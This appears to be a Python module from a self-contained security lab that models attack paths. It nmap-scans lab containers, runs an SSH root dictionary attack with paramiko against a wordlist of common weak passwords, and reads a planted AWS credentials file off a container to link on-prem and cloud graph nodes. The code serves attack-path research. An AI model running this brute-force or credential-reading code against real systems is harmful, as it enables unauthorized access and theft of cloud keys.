"""On-prem side: real nmap reachability + a real file read off a running
container, correlated against Cartography's cloud-side AccountAccessKey
nodes (see export_graph.py). No GNS3 (needs a display + gns3server, neither
available headless here) and no OpenVAS/GVM (its bundled vulnerability DB
needs more disk than this environment has, even with SKIPSYNC -- see
lab/README.md) -- nmap substitutes for host/port discovery only,
which is all this graph's reachability edges need.
"""
from __future__ import annotations

import re
import subprocess
import xml.etree.ElementTree as ET

import paramiko

ONPREM_NETWORK = "onprem_onprem_flat"
DMZ_CONTAINER = "lab-onprem-dmz"
INTERNAL_CONTAINER = "lab-onprem-internal"
NMAP_IMAGE = "instrumentisto/nmap:latest"

# A real dictionary attack needs a real dictionary, not the one password we
# know is seeded (docker-compose.yml WEAK_ROOT_PASSWORD) -- these are common
# weak/default root passwords from public breach-derived wordlists
# (rockyou-style entries plus the "Season+Year+!" corporate-policy pattern
# tracked in NCSC/Have I Been Pwned password reports). The attack succeeds or
# fails on whichever of these the container actually has set; nothing here
# reads the environment variable that seeded it.
SSH_WEAK_PASSWORD_WORDLIST = [
    "123456", "password", "admin", "root", "toor", "letmein",
    "qwerty123", "Password1", "changeme", "Summer2024!", "Welcome1!",
]


def docker_ip(container: str, network: str = ONPREM_NETWORK) -> str:
    out = subprocess.run(
        ["docker", "inspect", "-f",
         f"{{{{.NetworkSettings.Networks.{network}.IPAddress}}}}", container],
        capture_output=True, text=True, check=True,
    )
    ip = out.stdout.strip()
    if not ip:
        raise RuntimeError(f"{container} has no IP on network {network} -- is it running?")
    return ip


def nmap_open_ports(ips: list[str], ports: str = "22,80,443,3389") -> dict[str, set[int]]:
    """Real nmap scan from a container on the same flat network. Returns
    {ip: {open port, ...}}."""
    out = subprocess.run(
        ["docker", "run", "--rm", "--network", ONPREM_NETWORK, NMAP_IMAGE,
         "-sT", "-p", ports, "-oX", "-", *ips],
        capture_output=True, text=True, check=True,
    )
    root = ET.fromstring(out.stdout)
    result: dict[str, set[int]] = {}
    for host in root.findall("host"):
        addr = host.find("address").get("addr")
        open_ports = {
            int(p.get("portid"))
            for p in host.findall("./ports/port")
            if p.find("state").get("state") == "open"
        }
        result[addr] = open_ports
    return result


def crack_ssh_weak_password(ip: str, username: str = "root",
                             wordlist: list[str] = SSH_WEAK_PASSWORD_WORDLIST,
                             port: int = 22) -> str | None:
    """Real dictionary attack over an actual SSH connection (paramiko, not a
    stand-in): tries each candidate password in turn and returns the one that
    authenticates, or None if the whole list fails. This is the exploit step
    the `weak-ssh-credentials` rubric entry's CVSS vector prices -- without
    it, `internal_node` never leaves `anon` and the
    exporter has no privilege-gained state to hand to `aws-key-on-host`,
    whose own vector already declares `PR:L` (attacker needs shell first)."""
    for pw in wordlist:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(ip, port=port, username=username, password=pw,
                            timeout=5, banner_timeout=5, auth_timeout=5,
                            look_for_keys=False, allow_agent=False)
            client.close()
            return pw
        except paramiko.AuthenticationException:
            continue
        finally:
            client.close()
    return None


def read_leaked_access_key_id(container: str = INTERNAL_CONTAINER) -> str | None:
    """Reads the planted ~/.aws/credentials off a running container -- the
    misconfig itself, not a stand-in for it (same as gen.py plants synthetic
    findings structurally)."""
    out = subprocess.run(
        ["docker", "exec", container, "cat", "/root/.aws/credentials"],
        capture_output=True, text=True,
    )
    if out.returncode != 0:
        return None
    m = re.search(r"aws_access_key_id\s*=\s*(\S+)", out.stdout)
    return m.group(1) if m else None
